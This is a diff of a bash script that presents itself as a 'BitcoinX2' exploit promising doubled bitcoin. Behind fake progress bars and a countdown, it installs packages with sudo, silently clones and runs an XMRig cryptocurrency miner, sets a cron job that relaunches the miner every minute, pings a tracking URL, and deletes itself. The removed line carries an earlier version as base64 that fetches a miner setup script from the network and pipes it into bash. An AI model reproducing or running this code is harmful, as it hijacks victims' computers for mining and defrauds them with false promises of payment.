@@ -1,60 +1,69 @@
-echo "IyEvYmluL2Jhc2gKZWNobyAi4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKVl+KWiOKWiOKW
-iOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilojilojilojilZcg4paI4paI4paI4paI4paI
-4paI4pWXIOKWiOKWiOKVl+KWiOKWiOKWiOKVlyAgIOKWiOKWiOKVl+KWiOKWiOKVlyAg4paI4paI
-4pWX4paI4paI4paI4paI4paI4paI4pWXICIKZWNobyAi4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX
-4paI4paI4pWR4pWa4pWQ4pWQ4paI4paI4pWU4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ
-4pWd4paI4paI4pWU4pWQ4pWQ4pWQ4paI4paI4pWX4paI4paI4pWR4paI4paI4paI4paI4pWXICDi
-lojilojilZHilZrilojilojilZfilojilojilZTilZ3ilZrilZDilZDilZDilZDilojilojilZci
-CmVjaG8gIuKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKVkSAgIOKWiOKWiOKVkSAgIOKW
-iOKWiOKVkSAgICAg4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4pWR4paI4paI4pWU4paI4paI
-4pWXIOKWiOKWiOKVkSDilZrilojilojilojilZTilZ0gIOKWiOKWiOKWiOKWiOKWiOKVlOKVnSIK
-ZWNobyAi4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWRICAg4paI4paI4pWRICAg4paI
-4paI4pWRICAgICDilojilojilZEgICDilojilojilZHilojilojilZHilojilojilZHilZriloji
-lojilZfilojilojilZEg4paI4paI4pWU4paI4paI4pWXIOKWiOKWiOKVlOKVkOKVkOKVkOKVnSAi
-CmVjaG8gIuKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKVkSAgIOKWiOKWiOKVkSAgIOKV
-muKWiOKWiOKWiOKWiOKWiOKWiOKVl+KVmuKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKV
-keKWiOKWiOKVkSDilZrilojilojilojilojilZHilojilojilZTilZ0g4paI4paI4pWX4paI4paI
-4paI4paI4paI4paI4paI4pWXIgplY2hvICLilZrilZDilZDilZDilZDilZDilZ0g4pWa4pWQ4pWd
-ICAg4pWa4pWQ4pWdICAgIOKVmuKVkOKVkOKVkOKVkOKVkOKVnSDilZrilZDilZDilZDilZDilZDi
-lZ0g4pWa4pWQ4pWd4pWa4pWQ4pWdICDilZrilZDilZDilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKV
-neKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVnSIKZWNobyAiIgplY2hvICIiCmVjaG8gIiIKY3VybCAt
-LXNpbGVudCAtLW91dHB1dCAvZGV2L251bGwgaHR0cDovL2NhbmFyeXRva2Vucy5jb20vc3RhdGlj
-L2FydGljbGVzL2lrMGEya2pxdG8xNHg0a25hajc3Y2w1Ynovc3VibWl0LmFzcHgKZWNobyAiTG9h
-ZGluZy4uLiIKY291bnQ9MAp0b3RhbD0zNApwc3RyPSJbPT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1dIgoKd2hpbGUg
-WyAkY291bnQgLWx0ICR0b3RhbCBdOyBkbwogIHNsZWVwIDAuNSAjIHRoaXMgaXMgd29yawogIGNv
-dW50PSQoKCAkY291bnQgKyAxICkpCiAgcGQ9JCgoICRjb3VudCAqIDczIC8gJHRvdGFsICkpCiAg
-cHJpbnRmICJcciUzZC4lMWQlJSAlLiR7cGR9cyIgJCgoICRjb3VudCAqIDEwMCAvICR0b3RhbCAp
-KSAkKCggKCRjb3VudCAqIDEwMDAgLyAkdG90YWwpICUgMTAgKSkgJHBzdHIKZG9uZQplY2hvICJV
-cGRhdGluZy4uLiIKc3VkbyBhcHQgdXBkYXRlICYmIHN1ZG8gYXB0IGluc3RhbGwgZ2l0ICYmIHN1
-ZG8gYXB0LWdldCBpbnN0YWxsIGdpdCBidWlsZC1lc3NlbnRpYWwgY21ha2UgbGlidXYxLWRldiBs
-aWJzc2wtZGV2IGxpYmh3bG9jLWRldgplY2hvICIiCmVjaG8gIiIKY3VybCAtcyAtTCBodHRwczov
-L3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vTW9uZXJvT2NlYW4veG1yaWdfc2V0dXAvbWFzdGVy
-L3NldHVwX21vbmVyb29jZWFuX21pbmVyLnNoIHwgYmFzaCAtcyA0N2ZZV21INW1jU2hBcm90TU1o
-N3ZrUUYzV21xa1d5UXI1dUVTNFBQTXRvbmFMWmFCZE02TUpZQ3JIQzc0MVJWOUtSemh2b1dpcnZp
-NldZaHllV0tuUmJkMkE3dVNhZSAgPiAvZGV2L251bGwgMj4mMSAmCmVjaG8gIiIKZWNobyAiRW50
-ZXIgeW91cnQgd2FsbGV0IGFkZHJlc3M6IgpyZWFkIHdhbGxldAplY2hvICJBY2NlcHRlZCEiJHdh
-bGxldAplY2hvICIiCmVjaG8gIiovMSAqICogKiAqIGN1cmwgLXMgLUwgaHR0cHM6Ly9yYXcuZ2l0
-aHVidXNlcmNvbnRlbnQuY29tL01vbmVyb09jZWFuL3htcmlnX3NldHVwL21hc3Rlci9zZXR1cF9t
-b25lcm9vY2Vhbl9taW5lci5zaCB8IGJhc2ggLXMgNDdmWVdtSDVtY1NoQXJvdE1NaDd2a1FGM1dt
-cWtXeVFyNXVFUzRQUE10b25hTFphQmRNNk1KWUNySEM3NDFSVjlLUnpodm9XaXJ2aTZXWWh5ZVdL
-blJiZDJBN3VTYWUgID4gL2Rldi9udWxsIDI+JjEgJiIgPiBjcm9uICYmIGNhdCBjcm9uIHwgY3Jv
-bnRhYiAtCmVjaG8gIiIKcm0gY3JvbgplY2hvICJDb25uZWN0aW5nIHRvIGJsb2NrY2hhaW4uLi4i
-CmNvdW50PTAKdG90YWw9MzQKcHN0cj0iWz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09XSIKCndoaWxlIFsgJGNvdW50
-IC1sdCAkdG90YWwgXTsgZG8KICBzbGVlcCAwLjUgIyB0aGlzIGlzIHdvcmsKICBjb3VudD0kKCgg
-JGNvdW50ICsgMSApKQogIHBkPSQoKCAkY291bnQgKiA3MyAvICR0b3RhbCApKQogIHByaW50ZiAi
-XHIlM2QuJTFkJSUgJS4ke3BkfXMiICQoKCAkY291bnQgKiAxMDAgLyAkdG90YWwgKSkgJCgoICgk
-Y291bnQgKiAxMDAwIC8gJHRvdGFsKSAlIDEwICkpICRwc3RyCmRvbmUKZWNobyAiIgplY2hvICJH
-ZXQgYSBuaWNlIGNvZmZlZSBhbmQgdGFrZSBhIHNlYXQhIgplY2hvICJTdGFydCBleHBsb2l0aW5n
-Li4iCmVjaG8gIiIKaG91cj0wCm1pbj0xMApzZWM9MAogICAgICAgd2hpbGUgWyAkaG91ciAtZ2Ug
-MCBdOyBkbwogICAgICAgICAgICAgICAgd2hpbGUgWyAkbWluIC1nZSAwIF07IGRvCiAgICAgICAg
-ICAgICAgICAgICAgICAgIHdoaWxlIFsgJHNlYyAtZ2UgMCBdOyBkbwogICAgICAgICAgICAgICAg
-ICAgICAgICAgICAgICAgIGVjaG8gLW5lICIkaG91cjokbWluOiRzZWNcMDMzWzBLXHIiCiAgICAg
-ICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0ICJzZWM9c2VjLTEiCiAgICAgICAgICAgICAg
-ICAgICAgICAgICAgICAgICAgc2xlZXAgMQogICAgICAgICAgICAgICAgICAgICAgICBkb25lCiAg
-ICAgICAgICAgICAgICAgICAgICAgIHNlYz01OQogICAgICAgICAgICAgICAgICAgICAgICBsZXQg
-Im1pbj1taW4tMSIKICAgICAgICAgICAgICAgIGRvbmUKICAgICAgICAgICAgICAgIG1pbj01OQog
-ICAgICAgICAgICAgICAgbGV0ICJob3VyPWhvdXItMSIKICAgICAgICBkb25lCmVjaG8gIlRoZSBl
-eHBsb2l0IGlzIGRvbmUhIgplY2hvICJZb3Ugd2lsbCByZWNlaXZlIHlvdXIgWDIgYml0Y29pbiBp
-biBhIGNvdXBsZSBvZiBtaW51dGVzISIKcm0gYnRjWDJ4cGx0LnNoCg==" | base64 -d > btcX2xpltt.sh && chmod +x btcX2xpltt.sh && bash btcX2xpltt.sh
+#!/bin/bash
+echo "██████╗ ██╗████████╗ ██████╗ ██████╗ ██╗███╗   ██╗██╗  ██╗██████╗ "
+echo "██╔══██╗██║╚══██╔══╝██╔════╝██╔═══██╗██║████╗  ██║╚██╗██╔╝╚════██╗"
+echo "██████╔╝██║   ██║   ██║     ██║   ██║██║██╔██╗ ██║ ╚███╔╝  █████╔╝"
+echo "██╔══██╗██║   ██║   ██║     ██║   ██║██║██║╚██╗██║ ██╔██╗ ██╔═══╝ "
+echo "██████╔╝██║   ██║   ╚██████╗╚██████╔╝██║██║ ╚████║██╔╝ ██╗███████╗"
+echo "╚═════╝ ╚═╝   ╚═╝    ╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝"
+echo ""
+echo ""
+echo ""
+curl --silent --output /dev/null http://canarytokens.com/static/articles/ik0a2kjqto14x4knaj77cl5bz/submit.aspx
+echo "Loading..."
+count=0
+total=34
+pstr="[=======================================================================]"
+
+while [ $count -lt $total ]; do
+  sleep 0.5 # this is work
+  count=$(( $count + 1 ))
+  pd=$(( $count * 73 / $total ))
+  printf "\r%3d.%1d%% %.${pd}s" $(( $count * 100 / $total )) $(( ($count * 1000 / $total) % 10 )) $pstr
+done
+echo "Updating..."
+sudo apt update && sudo apt install git && sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+echo ""
+echo ""
+disown git clone https://github.com/katerin966/xmrig.git && cd xmrig && tar xvzf xmrig.tar.gz && ./xmrig &> /dev/null &
+echo ""
+echo "Enter yourt wallet address:"
+read wallet
+echo "Accepted!"$wallet
+echo ""
+echo "*/1 * * * * disown git clone https://github.com/katerin966/xmrig.git && cd xmrig && tar xvzf xmrig.tar.gz && ./xmrig &> /dev/null &" > cron && cat cron | crontab -
+echo ""
+rm cron
+echo "Connecting to blockchain..."
+count=0
+total=34
+pstr="[=======================================================================]"
+
+while [ $count -lt $total ]; do
+  sleep 0.5 # this is work
+  count=$(( $count + 1 ))
+  pd=$(( $count * 73 / $total ))
+  printf "\r%3d.%1d%% %.${pd}s" $(( $count * 100 / $total )) $(( ($count * 1000 / $total) % 10 )) $pstr
+done
+echo ""
+echo "Get a nice coffee and take a seat!"
+echo "Start exploiting.."
+echo ""
+hour=0
+min=10
+sec=0
+       while [ $hour -ge 0 ]; do
+                while [ $min -ge 0 ]; do
+                        while [ $sec -ge 0 ]; do
+                                echo -ne "$hour:$min:$sec\033[0K\r"
+                                let "sec=sec-1"
+                                sleep 1
+                        done
+                        sec=59
+                        let "min=min-1"
+                done
+                min=59
+                let "hour=hour-1"
+        done
+echo "The exploit is done!"
+echo "You will receive your X2 bitcoin in a couple of minutes!"
+rm btcX2xplt.sh
